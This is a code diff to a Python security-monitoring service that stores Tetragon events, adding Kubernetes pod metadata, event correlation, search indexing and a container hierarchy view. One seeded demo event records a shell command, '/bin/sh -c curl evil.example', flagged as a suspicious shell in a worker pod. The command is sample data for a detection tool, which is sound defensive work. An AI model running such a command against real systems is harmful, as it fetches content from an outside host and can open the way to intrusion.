@@ -9,9 +9,12 @@ from collections import defaultdict
 from datetime import datetime, timedelta, timezone
 from typing import Any
 
-from .models import DnsInfo, EventKind, FileInfo, NetworkInfo, ProcessInfo, SecurityEvent, Severity
+from .models import DnsInfo, EventKind, FileInfo, K8sInfo, NetworkInfo, ProcessInfo, SecurityEvent, Severity
+from . import correlator
+from . import search_index
 
 _events: list[SecurityEvent] = []
+_correlations: list[dict] = []
 _sensors: dict[str, dict[str, Any]] = {}
 _process_edges: dict[str, list[tuple[int, int, str]]] = defaultdict(list)
 _seeded = False
@@ -102,6 +105,53 @@ def _seed_demo() -> None:
         ),
         SecurityEvent(
             host_id="h1",
+            timestamp=now - timedelta(minutes=4),
+            kind=EventKind.PROCESS_EXEC,
+            severity=Severity.MEDIUM,
+            process=ProcessInfo(pid=1500, ppid=1, user="65532", binary="/app/server", args="--port=8080"),
+            k8s=K8sInfo(namespace="zeus", pod="api-server-7f8c9", container="api", deployment="api-server"),
+            summary="api-server container exec /app/server",
+        ),
+        SecurityEvent(
+            host_id="h1",
+            timestamp=now - timedelta(minutes=3),
+            kind=EventKind.NETWORK_CONNECT,
+            severity=Severity.INFO,
+            process=ProcessInfo(pid=1500, binary="/app/server", user="65532"),
+            network=NetworkInfo(dst_ip="10.96.0.12", port=5432, protocol="tcp"),
+            k8s=K8sInfo(namespace="zeus", pod="api-server-7f8c9", container="api", deployment="api-server"),
+            summary="api-server → postgres.zeus.svc:5432",
+        ),
+        SecurityEvent(
+            host_id="h1",
+            timestamp=now - timedelta(minutes=2),
+            kind=EventKind.PROCESS_EXEC,
+            severity=Severity.INFO,
+            process=ProcessInfo(pid=1600, user="65534", binary="/coredns", args="-conf /etc/coredns/Corefile"),
+            k8s=K8sInfo(namespace="kube-system", pod="coredns-abc12", container="coredns", deployment="coredns"),
+            summary="coredns container started",
+        ),
+        SecurityEvent(
+            host_id="h1",
+            timestamp=now - timedelta(minutes=1),
+            kind=EventKind.DNS_QUERY,
+            severity=Severity.INFO,
+            process=ProcessInfo(pid=1500, binary="/app/server", user="65532"),
+            dns=DnsInfo(query="redis.zeus.svc.cluster.local"),
+            k8s=K8sInfo(namespace="zeus", pod="api-server-7f8c9", container="api", deployment="api-server"),
+            summary="api-server DNS redis.zeus.svc.cluster.local",
+        ),
+        SecurityEvent(
+            host_id="h1",
+            timestamp=now - timedelta(seconds=45),
+            kind=EventKind.SECURITY,
+            severity=Severity.HIGH,
+            process=ProcessInfo(pid=1700, user="65532", binary="/bin/sh", args="-c curl evil.example"),
+            k8s=K8sInfo(namespace="zeus", pod="worker-xyz99", container="worker", deployment="batch-worker"),
+            summary="Suspicious shell in worker pod",
+        ),
+        SecurityEvent(
+            host_id="h1",
             timestamp=now - timedelta(minutes=5),
             kind=EventKind.SECURITY,
             severity=Severity.CRITICAL,
@@ -134,7 +184,16 @@ def ingest(event: SecurityEvent) -> SecurityEvent:
     if event.host_id not in _sensors:
         _sensors[event.host_id] = {"host_id": event.host_id, "status": "healthy", "tetragon_version": "1.0.0"}
     _sensors[event.host_id]["last_event_at"] = event.timestamp.isoformat()
+    doc = event.model_dump(mode="json")
+    search_index.index_event(doc)
+    _recompute_correlations()
     return event
+
+
+def _recompute_correlations() -> None:
+    global _correlations
+    recent = list_events(hours=48, limit=500)
+    _correlations = correlator.correlate_events(recent)
 
 
 def ingest_raw(host_id: str, lines: list[dict[str, Any]]) -> int:
@@ -192,10 +251,14 @@ def fleet_threat_summary() -> dict[str, Any]:
         for e in _events
         if e.severity in (Severity.CRITICAL, Severity.HIGH)
     ][:25]
+    corr = correlator.correlations_to_anomalies(list_correlations())
+    for c in corr:
+        if c.get("severity") in ("critical", "high"):
+            critical_events.insert(0, c)
     return {
         "fleet_threat_score": round(avg, 1),
         "hosts": summaries,
-        "critical_events": critical_events,
+        "critical_events": critical_events[:25],
         "sensors_healthy": sum(1 for s in _sensors.values() if s.get("status") == "healthy"),
         "sensors_total": len(_sensors),
     }
@@ -228,6 +291,67 @@ def process_graph(host_id: str, pid: int | None = None) -> dict[str, Any]:
     }
 
 
+def container_hierarchy(host_id: str) -> dict[str, Any]:
+    _seed_demo()
+    severity_rank = {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}
+    namespaces: dict[str, dict[str, Any]] = {}
+    for e in _events:
+        if e.host_id != host_id:
+            continue
+        k = e.k8s
+        if not (k.namespace or k.pod or k.container):
+            continue
+        ns_name = k.namespace or "default"
+        pod_name = k.pod or "unknown"
+        container_name = k.container or "main"
+        ns = namespaces.setdefault(
+            ns_name,
+            {"namespace": ns_name, "pods": {}, "event_count": 0},
+        )
+        ns["event_count"] += 1
+        pod = ns["pods"].setdefault(
+            pod_name,
+            {
+                "pod": pod_name,
+                "deployment": k.deployment,
+                "containers": {},
+                "event_count": 0,
+            },
+        )
+        pod["event_count"] += 1
+        if k.deployment and not pod.get("deployment"):
+            pod["deployment"] = k.deployment
+        container = pod["containers"].setdefault(
+            container_name,
+            {
+                "container": container_name,
+                "event_count": 0,
+                "processes": set(),
+                "max_severity": "info",
+            },
+        )
+        container["event_count"] += 1
+        if e.process.binary:
+            container["processes"].add(e.process.binary)
+        sev = e.severity.value
+        if severity_rank.get(sev, 0) > severity_rank.get(container["max_severity"], 0):
+            container["max_severity"] = sev
+    namespaces_out = []
+    for ns in namespaces.values():
+        pods_out = []
+        for pod in ns["pods"].values():
+            containers_out = []
+            for c in pod["containers"].values():
+                containers_out.append({**c, "processes": sorted(c["processes"])})
+            pods_out.append({**pod, "containers": containers_out})
+        namespaces_out.append({**ns, "pods": pods_out})
+    return {
+        "host_id": host_id,
+        "namespaces": sorted(namespaces_out, key=lambda n: n["namespace"]),
+        "summary": f"{len(namespaces_out)} namespace(s) with pod/container metadata from Tetragon",
+    }
+
+
 def open_ports(host_id: str) -> list[dict[str, Any]]:
     _seed_demo()
     ports = [
@@ -241,6 +365,9 @@ def open_ports(host_id: str) -> list[dict[str, Any]]:
 
 def search(query: str, host_id: str | None = None, limit: int = 50) -> list[dict[str, Any]]:
     _seed_demo()
+    os_hits = search_index.search(query, host_id, limit)
+    if os_hits:
+        return os_hits
     q = query.lower()
     out = []
     for e in _events:
@@ -252,6 +379,30 @@ def search(query: str, host_id: str | None = None, limit: int = 50) -> list[dict
         if len(out) >= limit:
             break
     return out
+
+
+def list_correlations() -> list[dict]:
+    _seed_demo()
+    _recompute_correlations()
+    return _correlations
+
+
+def fleet_timeline(hours: int = 24, limit: int = 200) -> list[dict]:
+    events = [e.model_dump(mode="json") for e in list_events(hours=hours, limit=limit)]
+    corrs = list_correlations()
+    merged = events + [
+        {
+            "id": c.get("id", f"corr-{i}"),
+            "host_id": c.get("host_id"),
+            "timestamp": events[0]["timestamp"] if events else None,
+            "kind": "correlation",
+            "severity": c.get("severity", "medium"),
+            "summary": c.get("summary"),
+            "source": "correlator",
+        }
+        for i, c in enumerate(corrs)
+    ]
+    return merged[:limit]
 
 
 def register_sensor(host_id: str, tetragon_version: str = "1.0.0") -> dict[str, Any]:
